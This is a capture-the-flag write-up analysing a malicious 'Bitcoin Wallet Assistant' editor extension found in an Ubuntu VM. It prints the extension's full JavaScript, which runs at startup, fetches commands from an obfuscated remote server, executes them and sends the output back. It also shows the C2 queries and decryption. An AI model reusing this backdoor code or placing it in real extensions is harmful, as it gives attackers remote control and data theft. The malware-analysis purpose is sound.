# Poor Investment Writeups

## Challenge Description

John decided to become a crypto developer and earn lots of money. After reading about the latest crypto heists, he decided to set up a secure development cloud environment. However, it didn't take a few hours after installing the operating system until all his cryptocurrency savings were drained. Now, what was going on?

**Flag:** `kaspersky{b4d_3x73n510n5_5734l_b1tc01n5}`

## Initial Analysis and First Impressions
I was provided with an Ubuntu VM ovm and disk image. I have not added it to the repo as its over 5 GB.

Upon accessing the VM, it looked like a normal Ubuntu setup. I didnt have the sudo password, so i rebooted and went to recovery to then get a root shell and give my user sudo perms and reset the password to 123 (yes, i know its insecure but i need something i wont forget).

I opened firefox and was given an option to restore the firefox session Several tabs were open:
- **Downloads - KeePass** tab
- **Add-ons Manager** tab  
- **MetaMask** tab
- **Search results for "coinbase" on extensions"** tab
- **Downloads | Cursor** tab
- **New Tab**

The MetaMask tab immediately caught my attention, and i kept that in mind for later.

## Initial Investigation

### Attempting to Access MetaMask

In the home directory, I found a file called `wallet_password.txt`:

```bash
cat wallet_password.txt
# Output: MyBitcoinsAreTheBest1
```

This seemed like the obvious solution - John's wallet password! However, when I tried entering this password into MetaMask, it failed. The password was incorrect, which was pretty confusing, as i thought it probably had to do with the wallet.

### Exploring the Browser Session

The restored Firefox session provided several clues:
- **KeePass downloads** suggested John was trying to use a password manager
- **Cursor downloads** indicated he was setting up a development environment
- **Add-ons Manager** was open, suggesting recent extension activity

This made it seem like John was setting up some sort of development enviornemnt, as there was also sublime and vscode in the downloads.

## File System Analysis

As the password didnt work on metaqmask, I decided to do a comprehensive search of the system:

```bash
find . \( -name "*password*" -o -name "*wallet*" -o -name "*seed*" -o -name "*mnemonic*" \)
```

This revealed a treasure trove of suspicious activity:

```
./cursor/extensions/bitcoin.btcwalletassist-9.7.1
./wallet_password.txt
./cache/vmware/drag_and_drop/JAuVfY/btcwalletassist-9.7.1.vsix
./cache/vmware/drag_and_drop/KUY2jt/extensions_from_otherpc/btcwalletassist-9.7.1.vsix
./cache/vmware/drag_and_drop/RzDX6f/btcwalletassist-9.7.1.vsix
./snap/snap-store/common/.cache/snap-store/snapd/snap-1password.smc
./config/google-chrome/Default/Extensions/dlcobpjiigpikoobohmabehhmhfoodbb/5.26.5_0/assets/onboarding/password.svg
./config/google-chrome/Default/Extensions/dlcobpjiigpikoobohmabehhmhfoodbb/5.26.5_0/assets/onboarding/wallet.svg
./config/google-chrome/Default/Extensions/dlcobpjiigpikoobohmabehhmhfoodbb/5.26.5_0/assets/onboarding/password-created.svg
./config/google-chrome/Default/Extensions/dlcobpjiigpikoobohmabehhmhfoodbb/5.26.5_0/images/software_wallet.png
[... many more Chrome extension files ...]
./config/google-chrome/zxcvbnData/3/passwords.txt
```

1. **Multiple instances** of `btcwalletassist-9.7.1.vsix` in VMware drag-and-drop cache
2. **Suspicious Bitcoin wallet extension** in the Cursor extensions directory
3. **Large password collection file** at `./config/google-chrome/zxcvbnData/3/passwords.txt`

```bash
wc ./config/google-chrome/zxcvbnData/3/passwords.txt
# Output: 30000   30000 241951 data.txt
```

This file contained 30,000 entries, and seemed suspicious.

## Investigating the cursor extension

### Extension Structure:

```bash
ls -la ./cursor/extensions/bitcoin.btcwalletassist-9.7.1/
```

```
total 20
drwxrwxr-x 2 user user 4096 Aug 28 19:44 .
drwxrwxr-x 8 user user 4096 Aug 28 19:47 ..
-rw-rw-r-- 1 user user 2403 Aug 28 19:44 extension.js
-rw-r--r-- 1 user user  564 Aug 28 19:44 package.json
-rw-rw-r-- 1 user user 1493 Aug 28 19:44 .vsixmanifest
```

### Package Analysis

```bash
cat ./cursor/extensions/bitcoin.btcwalletassist-9.7.1/package.json
```

```json
{
	"name": "btcwalletassist",
	"displayName": "Bitcoin Wallet Assistant",
	"description": "Provides integration with Bitcoin cryptocurrency wallets.",
	"version": "9.7.1",
	"publisher": "bitcoin",
	"engines": {
		"vscode": "^1.90.0"
	},
	"categories": [
		"Other"
	],
	"activationEvents": [
		"onStartupFinished"
	],
	"main": "./extension.js",
	"contributes": {},
	"scripts": {
		"package": "vsce package"
	},
	"devDependencies": {
		"vsce": "^2.15.0"
	}
}
```

**Red flags in the package.json:**
- Generic publisher name "bitcoin"
- Activation on "onStartupFinished" (runs immediately when VS Code starts)

### Analyzing what the extension actually does:

```bash
cat ./cursor/extensions/bitcoin.btcwalletassist-9.7.1/extension.js
```

The code revealed some form of sophisticated malware operation, which was stealing data:

```javascript
const os = require("os");
const { exec } = require("child_process");

function hexToBuf(hex) {
  if (typeof hex !== "string" || hex.length % 2 !== 0 || /[^0-9a-fA-F]/.test(hex)) {
    throw new Error("Invalid hex input.");
  }
  return Buffer.from(hex, "hex");
}

function rc4(keyBuf, dataBuf) {
  // Full RC4 encryption implementation
  const S = new Array(256);
  for (let i = 0; i < 256; i++) S[i] = i;
  let j = 0;
  for (let i = 0; i < 256; i++) {
    j = (j + S[i] + keyBuf[i % keyBuf.length]) & 0xff;
    [S[i], S[j]] = [S[j], S[i]];
  }
  const out = Buffer.allocUnsafe(dataBuf.length);
  let i = 0;
  j = 0;
  for (let k = 0; k < dataBuf.length; k++) {
    i = (i + 1) & 0xff;
    j = (j + S[i]) & 0xff;
    [S[i], S[j]] = [S[j], S[i]];
    const K = S[(S[i] + S[j]) & 0xff];
    out[k] = dataBuf[k] ^ K;
  }
  return out;
}

async function activate() {
  try {
    const hostname = os.hostname();
    const key = Buffer.from("bitcoin4ever", "utf8");
    const data = Buffer.from(hostname, "utf8");
    const cipher = rc4(key, data);
    const hex = cipher.toString("hex");
    const url = Buffer.from("aHR0cDovL3dlYjNzdGF0dXMudGFzay5zYXNjLnRmL3RhcmdldD8=", "base64").toString("utf8") + `data=${hex}`;
    
    const res = await fetch(url, { method: "GET" });
    if (!res.ok) return;
    
    const text = await res.text();
    const ct = hexToBuf(text);
    const pt = rc4(key, ct).toString("utf8");
    
    exec(pt, { windowsHide: true, maxBuffer: 10 * 1024 * 1024 }, 
      async (err, stdout, stderr) => {
        const combined = [stdout, stderr].filter(Boolean).join("");
        if (combined && combined.trim()) {
          const cmdout = combined.trim();
          const bufcmd = Buffer.from(cmdout, "utf8");
          const key2 = Buffer.from("ethereum4ever", "utf8");
          const cipher2 = rc4(key2, bufcmd);
          const hex2 = cipher2.toString("hex");
          const url2 = Buffer.from("aHR0cDovL3dlYjNzdGF0dXMudGFzay5zYXNjLnRmL3N0YXR1cz8=", "base64").toString("utf8") + `data=${hex2}`;
          
          const res2 = await fetch(url2, { method: "GET" });
        }
      }
    );
  } catch (err) {
    // Silent failure
  }
}
```

## Understanding the extension

### Deobfuscating the Communication

First, I decoded the base64-encoded URLs:

```bash
echo "aHR0cDovL3dlYjNzdGF0dXMudGFzay5zYXNjLnRmL3RhcmdldD8=" | base64 -d
# Output: http://web3status.task.sasc.tf/target?

echo "aHR0cDovL3dlYjNzdGF0dXMudGFzay5zYXNjLnRmL3N0YXR1cz8=" | base64 -d  
# Output: http://web3status.task.sasc.tf/status?
```

The malware was communicating with:
- **Command retrieval:** `web3status.task.sasc.tf/target?`
- **Data exfiltration:** `web3status.task.sasc.tf/status?`

### Simulating the Malware's Behavior

To understand what commands the malware executed, I recreated its encryption process:

```bash
hostname
# Output: mypc
```

I created a Python script to replicate the RC4 encryption:

```python
def rc4(key, data):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xff
        S[i], S[j] = S[j], S[i]
    
    out = bytearray()
    i = j = 0
    for k in range(len(data)):
        i = (i + 1) & 0xff
        j = (j + S[i]) & 0xff
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) & 0xff]
        out.append(data[k] ^ K)
    
    return bytes(out)

hostname = b"mypc"
key = b"bitcoin4ever"
cipher = rc4(key, hostname)
hex_data = cipher.hex()
print(f"Encrypted hostname: {hex_data}")
# Output: a3f54d8e
```

### Contacting the C2 Server

Using the encrypted hostname, I contacted the C2 server:

```bash
curl "http://web3status.task.sasc.tf/target?data=a3f54d8e"
```
but it gave no response, so i tried it with verbose (-v):

```bash
curl -v "http://web3status.task.sasc.tf/target?data=a3f54d8e"
```
Response:
```
* Host web3status.task.sasc.tf:80 was resolved.
* IPv6: (none)
* IPv4: 158.160.156.210
*   Trying 158.160.156.210:80...
* Connected to web3status.task.sasc.tf (158.160.156.210) port 80
> GET /target?data=a3f54d8e HTTP/1.1
> Host: web3status.task.sasc.tf
> User-Agent: curl/8.9.1
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 301 Moved Permanently
< location: https://web3status.task.sasc.tf/target?data=a3f54d8e
< date: Sun, 31 Aug 2025 19:51:00 GMT
< server: ycalb
< connection: close
< content-length: 0
<
* shutting down connection #0
```

The server redirected to HTTPS, so I tried:

```bash
curl "https://web3status.task.sasc.tf/target?data=a3f54d8e"
```

**Server Response (encrypted):**
```
e1ee5483a93e17c17915ba7c18ed94b101b472b91cd180f704232b6317ca27f8f7c90f7c2d6c3aa82ba6eda8f90a914c6614e32dddd8e74b0184cb7306c88ec369b22075c6f8c79f66452065d5d1e7857fc897d47f90b4532105f4a9
```

## Analyzing the response

I decrypted the server's response using the same RC4 key:

```python
hex_response = "e1ee5483a93e17c17915ba7c18ed94b101b472b91cd180f704232b6317ca27f8f7c90f7c2d6c3aa82ba6eda8f90a914c6614e32dddd8e74b0184cb7306c88ec369b22075c6f8c79f66452065d5d1e7857fc897d47f90b4532105f4a9"

encrypted_data = bytes.fromhex(hex_response)
key = b"bitcoin4ever"
decrypted = rc4(key, encrypted_data)
print("Decrypted command:")
print(decrypted.decode('utf-8', errors='ignore'))
```

**Decrypted Command:**
```bash
/bin/bash -c "export COMMAND_FLAG=kaspersky{b4d_3x73n510n5_5734l_b1tc01n5} && ls -la ~/.ssh"
```

and hence the flag is `kaspersky{b4d_3x73n510n5_5734l_b1tc01n5}`

This was an intersting challenge with many misleading objects and distractions in the VM like the firefox session and many more not documented in this writeup, until the extension was analyzed.

## Flag

**Flag:** `kaspersky{b4d_3x73n510n5_5734l_b1tc01n5}`